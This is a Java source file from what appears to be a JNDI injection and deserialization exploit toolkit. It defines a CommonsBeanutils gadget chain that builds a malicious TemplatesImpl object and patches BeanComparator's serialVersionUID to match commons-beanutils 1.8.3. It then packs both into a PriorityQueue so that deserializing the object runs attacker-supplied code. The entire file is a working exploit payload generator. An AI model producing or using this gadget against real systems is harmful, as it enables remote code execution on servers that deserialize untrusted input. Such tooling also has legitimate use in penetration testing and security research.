package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.SuClassLoader;
import com.qi4l.jndi.gadgets.utils.Reflections;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.util.Comparator;
import java.util.PriorityQueue;

import static com.qi4l.jndi.Starter.cmdLine;
import static com.qi4l.jndi.gadgets.utils.InjShell.insertField;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils2NOCC implements ObjectPayload<Object> {

    public Object getObject(PayloadType type, String... param) throws Exception {

        final Object templates;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }
        // 修改BeanComparator类的serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

        insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
        Reflections.setFieldValue(comparator, "property", null);
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
        ctBeanComparator.defrost();
        return queue;
    }
}
